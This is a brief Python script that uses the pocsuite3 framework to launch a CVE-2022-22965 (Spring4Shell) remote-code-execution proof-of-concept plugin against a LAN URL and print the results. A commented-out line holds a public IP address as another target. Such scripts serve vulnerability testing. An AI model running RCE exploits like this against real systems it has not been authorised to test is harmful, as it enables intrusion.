import json
from pocsuite3.api import init_pocsuite, start_pocsuite, get_results

def run_poc():
    config = {
        # "url": ["http://139.196.240.149:8080/"],
        "url": ["http://192.168.3.90:8080/stupidRumor_war_war/index?name=1/"],
        "poc": ["../plugins/RCE/CVE-2022-22965_SpringCore.py"],
        "method": 'GET',
    }

    init_pocsuite(config)
    start_pocsuite()
    results = get_results()
    for result in results:
        result_dict = result.get("result")
        if result_dict:
            print(json.dumps(result_dict, indent=4))


if __name__ == "__main__":
    run_poc()
